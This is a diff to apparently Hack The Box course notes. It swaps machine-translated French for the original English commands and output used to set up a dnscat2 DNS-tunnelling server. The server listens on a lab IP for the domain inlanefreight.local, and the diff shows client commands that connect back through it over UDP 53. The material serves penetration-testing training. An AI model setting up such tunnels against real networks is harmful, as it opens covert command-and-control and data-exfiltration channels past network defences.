@@ -19,9 +19,9 @@ Clonage de dnscat2 et configuration du serveur
 ```
 dsgsec@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git
 
-cd dnscat2/serveur/
-bundle d'installation de gem
-installation groupée
+cd dnscat2/server/
+gem install bundler
+bundle install
 
 ```
 
@@ -34,28 +34,28 @@ Démarrage du serveur dnscat2
 ```
 dsgsec@htb[/htb]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
 
-Nouvelle fenêtre créée : 0
-dnscat2> Nouvelle fenêtre créée : crypto-debug
-Bienvenue sur dnscat2 ! Certains documents peuvent être obsolètes.
+New window created: 0
+dnscat2> New window created: crypto-debug
+Welcome to dnscat2! Some documentation may be out of date.
 
-attachement_auto => faux
-history_size (pour les nouvelles fenêtres) => 1000
-Politique de sécurité modifiée : toutes les connexions doivent être cryptées
-Nouvelle fenêtre créée : dns1
-Démarrage du serveur DNS Dnscat2 le 10.10.14.18:53
-[domaines = inlanefreight.local]...
+auto_attach => false
+history_size (for new windows) => 1000
+Security policy changed: All connections must be encrypted
+New window created: dns1
+Starting Dnscat2 DNS server on 10.10.14.18:53
+[domains = inlanefreight.local]...
 
-En supposant que vous ayez un serveur DNS faisant autorité, vous pouvez exécuter
-le client n'importe où avec ce qui suit (--secret est facultatif) :
+Assuming you have an authoritative DNS server, you can run
+the client anywhere with the following (--secret is optional):
 
-   ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local
+  ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local
 
-Pour parler directement au serveur sans nom de domaine, exécutez :
+To talk directly to the server without a domain name, run:
 
-   ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21
+  ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21
 
-Bien sûr, vous devez découvrir <serveur> vous-même ! Clients
-se connectera directement sur le port UDP 53.
+Of course, you have to figure out <server> yourself! Clients
+will connect directly on UDP port 53.
 
 ```
 
